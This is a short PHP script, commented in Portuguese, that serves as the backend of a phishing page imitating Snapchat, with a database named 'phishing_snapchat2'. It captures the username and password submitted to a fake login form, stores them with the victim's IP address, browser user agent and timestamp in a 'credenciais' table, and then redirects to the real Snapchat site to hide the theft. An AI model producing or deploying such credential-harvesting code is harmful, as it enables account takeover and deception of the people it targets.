<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Dados de conexão
    $host = "localhost";
    $user = "root";
    $pass = "";
    $db   = "phishing_snapchat2";

    // Criando conexão
    $conn = new mysqli($host, $user, $pass, $db);

    // Verificando conexão
    if ($conn->connect_error) {
        die("Falha na conexão com o banco: " . $conn->connect_error);
    }

    // Receber e escapar os dados do formulário
    $username = $conn->real_escape_string($_POST['username']);
    $senha = $conn->real_escape_string($_POST['senha']);

    // Informações adicionais
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $data = date('Y-m-d H:i:s');

    // Inserir no banco
    $sql = "INSERT INTO credenciais (username, senha, ip, user_agent, data_coleta)
            VALUES ('$username', '$senha', '$ip', '$user_agent', '$data')";

    if ($conn->query($sql) === TRUE) {
        // Feche a conexão antes de redirecionar
        $conn->close();

        // Redirecione para o site oficial do Snapchat
        header("Location: https://www.snapchat.com/");
        exit();
    } else {
        echo "Erro ao salvar os dados: " . $conn->error;
    }

    $conn->close();
} else {
    // Se acessado diretamente, redirecione para o formulário
    header("Location: index.html");
    exit();
}
?>